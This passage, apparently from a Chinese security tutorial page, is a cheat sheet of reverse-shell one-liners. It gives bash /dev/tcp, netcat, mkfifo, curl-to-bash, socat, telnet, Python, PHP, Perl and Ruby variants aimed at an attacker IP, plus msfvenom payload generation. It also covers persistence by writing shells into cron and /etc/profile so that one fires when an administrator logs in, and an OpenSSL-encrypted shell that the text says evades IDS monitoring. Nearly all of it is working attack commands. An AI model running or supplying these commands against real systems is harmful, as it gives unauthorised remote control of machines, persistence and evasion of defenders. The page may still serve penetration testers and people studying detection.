</code></pre></div><div class="custom-container info"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">解释</p><p>bash -i 产生一个 bash 交互环境。 &amp;&gt; 和 &gt;&amp; 和 2&gt;&amp;1 是一个意思，都是将标准错误输出合并到标准输出中。 /dev/tcp/ 是 Linux 中的一个特殊设备,打开这个文件就相当于发出了一个 socket 调用，建立一个 socket 连接，读写这个文件就相当于在这个 socket 连接中传输数据。 0&gt;&amp;1 和 0&lt;&amp;1 是将标准输入重定向到标准输出中。</p></div><div class="custom-container tip"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">补充</p><ul><li>&gt;&amp;：将联合符号前面的内容与后面相结合，然后一起重定向给后者。</li><li>/dev/tcp/47.xxx.xxx.72/2333：Linux 环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机 47.xxx.xxx.72 的 2333 端口建立一个 tcp 连接。</li><li>0&gt;&amp;1：将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。</li></ul><p>Bash 反弹一句完整的解读过程就是：</p><p>Bash 产生了一个交互环境和本地主机主动发起与攻击机 2333 端口建立的连接（即 TCP 2333会话连接）相结合，然后在重定向个 TCP 2333 会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个 Bash 反弹环境。</p></div><h3 id="攻击机开启本地监听-1" tabindex="-1"><a class="header-anchor" href="#攻击机开启本地监听-1" aria-hidden="true">#</a> 攻击机开启本地监听</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">2333</span>
</code></pre></div><h3 id="目标机主动连接攻击机-1" tabindex="-1"><a class="header-anchor" href="#目标机主动连接攻击机-1" aria-hidden="true">#</a> 目标机主动连接攻击机</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/47.xxx.xxx.72/2333 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
</code></pre></div><h3 id="tcp-协议-shell" tabindex="-1"><a class="header-anchor" href="#tcp-协议-shell" aria-hidden="true">#</a> TCP 协议 shell</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/192.168.128.128/9999 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>/bin/bash <span class="token parameter variable">-i</span> <span class="token operator">&gt;</span> /dev/tcp/192.168.128.128/9999 <span class="token operator"><span class="token file-descriptor important">0</span>&lt;&amp;</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">5</span>&lt;&gt;</span>/dev/tcp/192.168.128.128/9999<span class="token punctuation">;</span><span class="token function">cat</span> <span class="token operator">&lt;</span><span class="token file-descriptor important">&amp;5</span> <span class="token operator">|</span> <span class="token keyword">while</span> <span class="token builtin class-name">read</span> line<span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token variable">$line</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;5</span> <span class="token operator">&gt;</span><span class="token file-descriptor important">&amp;5</span><span class="token punctuation">;</span> <span class="token keyword">done</span>
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">exec</span> /bin/sh <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/dev/tcp/192.168.128.128/9999 <span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span><span class="token file-descriptor important">&amp;0</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;0</span>
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token operator"><span class="token file-descriptor important">0</span>&lt;&amp;</span><span class="token number">196</span><span class="token punctuation">;</span><span class="token builtin class-name">exec</span> <span class="token number">19</span><span class="token operator"><span class="token file-descriptor important">6</span>&lt;&gt;</span>/dev/tcp/192.168.128.128/9999<span class="token punctuation">;</span> <span class="token function">sh</span> <span class="token operator">&lt;&amp;</span><span class="token number">196</span> <span class="token operator">&gt;&amp;</span><span class="token number">196</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;&amp;</span><span class="token number">196</span>
</code></pre></div><h3 id="udp-协议-shell" tabindex="-1"><a class="header-anchor" href="#udp-协议-shell" aria-hidden="true">#</a> UDP 协议 shell</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-e</span> /bin/sh <span class="token number">192.168</span>.128.128 <span class="token number">9999</span>
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-e</span> /bin/bash <span class="token number">192.168</span>.128.128 <span class="token number">9999</span>
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-c</span> <span class="token function">bash</span> <span class="token number">192.168</span>.128.128 <span class="token number">9999</span>
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">mknod</span> backpipe p <span class="token operator">&amp;&amp;</span> <span class="token function">nc</span> <span class="token number">192.168</span>.128.128 <span class="token number">9999</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>backpipe <span class="token operator">|</span> /bin/bash <span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>backpipe 
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">rm</span> /tmp/f<span class="token punctuation">;</span><span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span><span class="token function">cat</span> /tmp/f<span class="token operator">|</span>/bin/sh <span class="token parameter variable">-i</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span><span class="token operator">|</span><span class="token function">nc</span> <span class="token number">192.168</span>.128.128 <span class="token number">9999</span> <span class="token operator">&gt;</span>/tmp/f
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">rm</span> <span class="token parameter variable">-f</span> /tmp/p<span class="token punctuation">;</span> <span class="token function">mknod</span> /tmp/p p <span class="token operator">&amp;&amp;</span> <span class="token function">nc</span> <span class="token number">192.168</span>.128.128 <span class="token number">9999</span> <span class="token number">0</span>/tmp/p <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">rm</span> f<span class="token punctuation">;</span><span class="token function">mkfifo</span> f<span class="token punctuation">;</span><span class="token function">cat</span> f<span class="token operator">|</span>/bin/sh <span class="token parameter variable">-i</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span><span class="token operator">|</span><span class="token function">nc</span> <span class="token number">192.168</span>.128.128 <span class="token number">9999</span> <span class="token operator">&gt;</span> f
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">rm</span> <span class="token parameter variable">-f</span> x<span class="token punctuation">;</span> <span class="token function">mknod</span> x p <span class="token operator">&amp;&amp;</span> <span class="token function">nc</span> <span class="token number">192.168</span>.128.128 <span class="token number">9999</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>x <span class="token operator">|</span> /bin/bash <span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>x
</code></pre></div><p>执行效果如下：</p><p><img src="/images/image20210424124124.png" alt=""></p><h2 id="curl-配合-bash-反弹-shell" tabindex="-1"><a class="header-anchor" href="#curl-配合-bash-反弹-shell" aria-hidden="true">#</a> Curl 配合 Bash 反弹 shell</h2><blockquote><p>这里操作也很简单，借助了 Linux 中的管道。</p></blockquote><p>首先，在攻击者 vps 的 web 目录里面创建一个 index 文件（index.php 或 index.html），内容如下：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/47.xxx.xxx.72/2333 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
</code></pre></div><p>并开启 2333 端口的监听。</p><p>然后再目标机上执行如下，即可反弹 shell：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">curl</span> <span class="token number">47</span>.xxx.xxx.72<span class="token operator">|</span><span class="token function">bash</span>
</code></pre></div><p>执行效果如下：</p><p><img src="/images/image20210424124222.png" alt=""></p><p>根据 curl 命令和 Linux 管道的作用，你不难理解这其中的原理。</p><p>Curl 配合 Bash 反弹 shell 的方式在 CTF 题目中经常出现，<code>curl IP|bash</code> 中的 IP 可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。</p><p>将反弹 shell 的命令写入定时任务</p><p>我们可以在目标主机的定时任务文件中写入一个反弹 shell 的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在<code> /var/spool/cron/[crontabs]/&lt;username&gt;</code> 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。</p><p>比如，当前用户名为 root，我们就要将下面内容写入到 <code>/var/spool/cron/root</code> 中。(centos 系列主机)</p><p>比如，当前用户名为 root，我们就要将下面内容写入到 <code>/var/spool/cron/crontabs/root</code> 中。(Debian/Ubuntu 系列主机)</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>*/1  *  *  *  *   /bin/bash -i<span class="token operator">&gt;&amp;</span>/dev/tcp/47.xxx.xxx.72/2333 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
<span class="token comment">#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell</span>
</code></pre></div><p>将以下反弹 shell 的命写入 /etc/profile 文件中，/etc/profile 中的内容会在用户打开 bash 窗口时执行。</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>/bin/bash <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/47.xxx.xxx.72/2333 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span>
<span class="token comment"># 最后面那个&amp;为的是防止管理员无法输入命令</span>
</code></pre></div><p>当目标主机管理员远程连接该主机时，就会执行该命令，成功获得目标机的 shell：</p><p><img src="/images/image20210424124416.png" alt=""></p><h2 id="利用-socat-反弹-shell" tabindex="-1"><a class="header-anchor" href="#利用-socat-反弹-shell" aria-hidden="true">#</a> 利用 Socat 反弹 shell</h2><p>Socat 是 Linux 下一个多功能的网络工具，名字来由是&quot;Socket CAT&quot;，因此可以看出它是基于 socket 的，其功能与 netcat 类似，不过据说可以看做netcat的加强版，事实上的确也是如此。我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参见这里：<a href="http://brieflyx.me/2015/linux-tools/socat-introduction/" target="_blank" rel="noopener noreferrer">http://brieflyx.me/2015/linux-tools/socat-introduction/<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p>安装Socat的方法很简单：</p><ul><li>Ubuntu等可以直接使用 <code>apt-get install socat</code> 命令进行安装</li><li>也可以去官网下载源码包：<a href="http://www.dest-unreach.org/socat" target="_blank" rel="noopener noreferrer">http://www.dest-unreach.org/socat<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li></ul><h3 id="攻击机开启本地监听-2" tabindex="-1"><a class="header-anchor" href="#攻击机开启本地监听-2" aria-hidden="true">#</a> 攻击机开启本地监听</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>socat TCP-LISTEN:2333 -
或
<span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">2333</span>
</code></pre></div><h3 id="目标机主动连接攻击机-2" tabindex="-1"><a class="header-anchor" href="#目标机主动连接攻击机-2" aria-hidden="true">#</a> 目标机主动连接攻击机</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>socat tcp-connect:47.xxx.xxx.72:2333 exec:<span class="token string">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane
</code></pre></div><p>执行效果如下：</p><p><img src="/images/image20210424124644.png" alt=""></p><h2 id="利用-telnet-反弹-shell" tabindex="-1"><a class="header-anchor" href="#利用-telnet-反弹-shell" aria-hidden="true">#</a> 利用 Telnet 反弹 shell</h2><p>当 nc 和 /dev/tcp 不可用，且目标主机和攻击机上支持 Telnet 服务时，我们可以使用 Telnet 反弹 shell。</p><p>方法一：</p><h3 id="攻击机开启本地监听-3" tabindex="-1"><a class="header-anchor" href="#攻击机开启本地监听-3" aria-hidden="true">#</a> 攻击机开启本地监听</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">2333</span>
</code></pre></div><h3 id="目标机主动连接攻击机-3" tabindex="-1"><a class="header-anchor" href="#目标机主动连接攻击机-3" aria-hidden="true">#</a> 目标机主动连接攻击机</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">mknod</span> a p<span class="token punctuation">;</span> telnet <span class="token number">47</span>.xxx.xxx.72 <span class="token number">2333</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>a <span class="token operator">|</span> /bin/bash <span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>a
</code></pre></div><p>执行效果如下：</p><p><img src="/images/image20210424124731.png" alt=""></p><p>方法二：</p><h3 id="攻击机需要开启两个本地监听" tabindex="-1"><a class="header-anchor" href="#攻击机需要开启两个本地监听" aria-hidden="true">#</a> 攻击机需要开启两个本地监听</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">2333</span>
<span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">4000</span>
</code></pre></div><h3 id="目标机主动连接攻击机-4" tabindex="-1"><a class="header-anchor" href="#目标机主动连接攻击机-4" aria-hidden="true">#</a> 目标机主动连接攻击机</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>telnet <span class="token number">47.101</span>.57.72 <span class="token number">2333</span> <span class="token operator">|</span> /bin/bash <span class="token operator">|</span> telnet <span class="token number">47.101</span>.57.72 <span class="token number">4000</span>
</code></pre></div><p>执行效果如下：</p><p><img src="/images/image20210424124858.png" alt=""></p><h2 id="各种脚本反弹-shell" tabindex="-1"><a class="header-anchor" href="#各种脚本反弹-shell" aria-hidden="true">#</a> 各种脚本反弹 shell</h2><h3 id="python-脚本反弹shell" tabindex="-1"><a class="header-anchor" href="#python-脚本反弹shell" aria-hidden="true">#</a> Python 脚本反弹shell</h3><p>当目标主机上有 python 环境时，我们可以用 Python 来反弹 shell。Python 在现在一般发行版 Linux 系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p><h4 id="攻击机开启本地监听-4" tabindex="-1"><a class="header-anchor" href="#攻击机开启本地监听-4" aria-hidden="true">#</a> 攻击机开启本地监听</h4><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">2333</span>
</code></pre></div><h4 id="目标机主动连接攻击机-5" tabindex="-1"><a class="header-anchor" href="#目标机主动连接攻击机-5" aria-hidden="true">#</a> 目标机主动连接攻击机</h4><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>python <span class="token parameter variable">-c</span> <span class="token string">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.xxx.xxx.72&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span>
</code></pre></div><p>执行效果如下：</p><p><img src="/images/image20210424125020.png" alt=""></p><h3 id="php-脚本反弹shell" tabindex="-1"><a class="header-anchor" href="#php-脚本反弹shell" aria-hidden="true">#</a> php 脚本反弹shell</h3><p>当目标主机上有 php 环境时，我们可以用 php 来反弹 shell。</p><h4 id="攻击机开启本地监听-5" tabindex="-1"><a class="header-anchor" href="#攻击机开启本地监听-5" aria-hidden="true">#</a> 攻击机开启本地监听</h4><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">2333</span>
</code></pre></div><h4 id="目标机主动连接攻击机-6" tabindex="-1"><a class="header-anchor" href="#目标机主动连接攻击机-6" aria-hidden="true">#</a> 目标机主动连接攻击机</h4><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>php <span class="token parameter variable">-r</span> <span class="token string">&#39;$sock=fsockopen(&quot;47.xxx.xxx.72&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span>
</code></pre></div><h3 id="perl-脚本反弹shell" tabindex="-1"><a class="header-anchor" href="#perl-脚本反弹shell" aria-hidden="true">#</a> Perl 脚本反弹shell</h3><p>当目标主机上有 perl 环境时，我们可以用 perl 来反弹 shell。</p><h4 id="攻击机开启本地监听-6" tabindex="-1"><a class="header-anchor" href="#攻击机开启本地监听-6" aria-hidden="true">#</a> 攻击机开启本地监听</h4><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">2333</span>
</code></pre></div><h4 id="目标机主动连接攻击机-7" tabindex="-1"><a class="header-anchor" href="#目标机主动连接攻击机-7" aria-hidden="true">#</a> 目标机主动连接攻击机</h4><div class="language-text" data-ext="text"><pre class="language-text"><code>perl -e &#39;use Socket;$i=&quot;47.101.57.72&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
</code></pre></div><p>执行效果如下：</p><p><img src="/images/image20210424125155.png" alt=""></p><h3 id="ruby脚本反弹shel" tabindex="-1"><a class="header-anchor" href="#ruby脚本反弹shel" aria-hidden="true">#</a> Ruby脚本反弹shel</h3><p>当目标主机上有 ruby 环境时，我们可以用 ruby 来反弹 shell。</p><h4 id="攻击机开启本地监听-7" tabindex="-1"><a class="header-anchor" href="#攻击机开启本地监听-7" aria-hidden="true">#</a> 攻击机开启本地监听</h4><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">2333</span>
</code></pre></div><h4 id="目标机主动连接攻击机-8" tabindex="-1"><a class="header-anchor" href="#目标机主动连接攻击机-8" aria-hidden="true">#</a> 目标机主动连接攻击机</h4><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>ruby <span class="token parameter variable">-rsocket</span> <span class="token parameter variable">-e</span> <span class="token string">&#39;c=TCPSocket.new(&quot;47.xxx.xxx.72&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</span>
或
ruby <span class="token parameter variable">-rsocket</span> <span class="token parameter variable">-e</span> <span class="token string">&#39;exit if fork;c=TCPSocket.new(&quot;47.xxx.xxx.72&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</span>
</code></pre></div><p>执行效果如下：</p><p><img src="/images/image20210424125249.png" alt=""></p><h3 id="使用-metasploit-生成反弹-shell" tabindex="-1"><a class="header-anchor" href="#使用-metasploit-生成反弹-shell" aria-hidden="true">#</a> 使用 Metasploit 生成反弹 shell</h3><p>强大的 Metasploit 框架也为我们提供了生成一句话反弹 shell 的工具，即 msfvenom，绝对的实用。当我们不记得前面说的所有反弹shell的反弹语句时，只要我们有 Metasploit，那么我们随时都可以使用 <code>msfvenom -l</code> 来查询生成我们所需要的各类命令行一句话，具体使用方法如下。</p><p>我们直接可以使用 <code>msfvenom -l</code> 结合关键字过滤（如cmd/unix/reverse），列出我们需要生成的各类反弹shell一句话的payload：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>msfvenom <span class="token parameter variable">-l</span> payloads <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">&#39;cmd/unix/reverse&#39;</span>
</code></pre></div><p><code>msfvenom -p cmd/unix/reverse_python LHOST=47.xxx.xxx.72 LPORT=2333 -f raw</code></p><h2 id="反弹-shell-后获取模拟终端" tabindex="-1"><a class="header-anchor" href="#反弹-shell-后获取模拟终端" aria-hidden="true">#</a> 反弹 shell 后获取模拟终端</h2><p>其实，上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。</p><ul><li>获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。</li><li>标准的错误输出无法显示，无法正常使用vim等文本编辑器等。</li><li>获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。</li></ul><p><img src="/images/image20210424125538.png" alt=""></p><p>这往往都是因为我们获取的shell并不是标准的虚拟终端，为了能够完成输入密码等操作，我们必须模拟一个真正的终端设备。</p><p>我们其实可以借助于python默认包含的一个 pty 标准库来获取一个标准的虚拟终端环境。Python 在现在一般发行版 Linux 系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p><p>我们只需在获取的 shell 里面输入如下命令，即可模拟一个终端设备：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>python <span class="token parameter variable">-c</span> <span class="token string">&quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</span>
</code></pre></div><p><img src="/images/image20210424125600.png" alt=""></p><p>如上图所示，成功模拟在shell中出了一个终端设备，并成功执行了sudo等命令。</p><h2 id="使用openssl反弹加密shell" tabindex="-1"><a class="header-anchor" href="#使用openssl反弹加密shell" aria-hidden="true">#</a> 使用OpenSSL反弹加密shell</h2><p>在上文中，我们总结了很多反弹shell得方法，但是我发现这种反弹 shell 方式都有一个缺点，那就是所有的流量都是明文传输的。这些通过shell通过传输的流量都可以被管理员直接抓取并理解，当目标主机网络环境存在网络防御检测系统时（IDS、IPS等），网络防御检测系统会获取到我们的通信内容并进行告警和阻止。因此，我们需要对通信的内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密的 shell。</p><h3 id="openssl-简介" tabindex="-1"><a class="header-anchor" href="#openssl-简介" aria-hidden="true">#</a> OpenSSL 简介</h3><p>在计算机网络上，OpenSSL 是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。</p><p>SSL 协议要求建立在可靠的传输层协议(TCP)之上。SSL 协议的优势在于它是与应用层协议独立无关的，高层的应用层协议(例如：HTTP，FTP，TELNET 等)能透明地建立于 SSL 协议之上。SSL 协议在应用层协议通信之前就已经完成加密算法、通信密钥的协商及服务器认证工作。在此之后应用层协议所传送的数据都会被加密，从而保证通信的私密性。</p><p>在利用 OpenSSL 反弹 shell 之前需要先生成自签名证书：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>openssl req <span class="token parameter variable">-x509</span> <span class="token parameter variable">-newkey</span> rsa:2048 <span class="token parameter variable">-keyout</span> key.pem <span class="token parameter variable">-out</span> cert.pem <span class="token parameter variable">-days</span> <span class="token number">365</span> <span class="token parameter variable">-nodes</span>
</code></pre></div><p>生成自签名证书时会提示输入证书信息，如果懒得填写可以一路回车即可：</p><p><img src="/images/image20210424125716.png" alt=""></p><h3 id="使用-openssl-反弹加密-shell" tabindex="-1"><a class="header-anchor" href="#使用-openssl-反弹加密-shell" aria-hidden="true">#</a> 使用 OpenSSL 反弹加密 shell</h3><blockquote><p>实验环境：Linux</p></blockquote><p>目标机：</p><ul><li>系统：Linux</li><li>IP：192.168.1.8</li></ul><p>攻击机：</p><ul><li>系统：Linux</li><li>IP：47.xxx.xxx.72</li></ul><p>假设我们从目标机反弹 shell 到攻击机 。首先需要利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口，在这里使用 2333 端口：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>openssl s_server <span class="token parameter variable">-quiet</span> <span class="token parameter variable">-key</span> key.pem <span class="token parameter variable">-cert</span> cert.pem <span class="token parameter variable">-port</span> <span class="token number">2333</span>
</code></pre></div><p><img src="/images/image20210424125758.png" alt=""></p><p>此时 OpenSSL 便在攻击机的 2333 端口上启动了一个 SSL/TLS server。</p><p>这时在目标机进行反弹 shell 操作，命令为：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">mkfifo</span> /tmp/s<span class="token punctuation">;</span> /bin/sh <span class="token parameter variable">-i</span> <span class="token operator">&lt;</span> /tmp/s <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">|</span> openssl s_client <span class="token parameter variable">-quiet</span> <span class="token parameter variable">-connect</span> <span class="token number">47</span>.xxx.xxx.72:2333 <span class="token operator">&gt;</span> /tmp/s<span class="token punctuation">;</span> <span class="token function">rm</span> /tmp/s
</code></pre></div><p><img src="/images/image20210424125827.png" alt=""></p><p>这样攻击者便使用 OpenSSL 反弹了目标机一个加密的 shell。</p></div><hr><footer class="page-meta"><div class="meta-item edit-link"><span class="xicon-container left meta-item-label"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:20px;height:20px;font-size:20px;color:inherit;"><path d="M2 26h28v2H2z" fill="currentColor"></path><path d="M25.4 9c.8-.8.8-2 0-2.8l-3.6-3.6c-.8-.8-2-.8-2.8 0l-15 15V24h6.4l15-15zm-5-5L24 7.6l-3 3L17.4 7l3-3zM6 22v-3.6l10-10l3.6 3.6l-10 10H6z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Edit this page<!--]--></span></span></div><div class="meta-item last-updated"><span class="xicon-container left meta-item-label"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:20px;height:20px;font-size:20px;color:inherit;"><path d="M26 4h-4V2h-2v2h-8V2h-2v2H6c-1.1 0-2 .9-2 2v20c0 1.1.9 2 2 2h20c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 22H6V12h20v14zm0-16H6V6h4v2h2V6h8v2h2V6h4v4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Last Updated 2023/6/30 16:13:01<!--]--></span></span></div></footer></div></div><!-- <PageNav /> --><div class="reco-valine-wrapper" style="display:none;"><div id="valine"></div></div></main><!--]--><!-- <div class="catalog">
        <Catalog v-if="isShowCatalog" />
      </div> --></div></div></div><!----><!----><!--]--></div>
    <script type="module" src="/assets/app-83ee7d39.js" defer></script>
  </body>
</html>
